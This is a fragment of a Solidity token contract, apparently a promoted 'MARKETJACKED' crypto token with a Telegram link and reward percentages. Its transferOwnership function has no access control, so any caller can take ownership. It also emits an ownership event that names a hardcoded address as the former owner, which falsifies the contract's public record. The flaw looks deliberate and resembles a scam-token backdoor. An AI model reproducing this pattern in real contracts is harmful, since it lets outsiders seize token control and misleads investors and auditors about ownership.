...
/**
 * TELEGRAM: HTTPS://T.ME/MARKETJACKED
 * WEBSITE : WWW.MARKETJACKED.CA
 * REWARD
 * 9% CAKE REWARD - 4% LIQUIDITY - 1% MARKETING
...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        emit OwnershipTransferred(0x72dd03Af3cBac8Cd5e49DF2f742049Aa4D059019, newOwner);
        _owner = newOwner;
    }
...
contract MARKETJACKED is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "MARKETJACKED";
  string private _name = "MARKETJACKED";
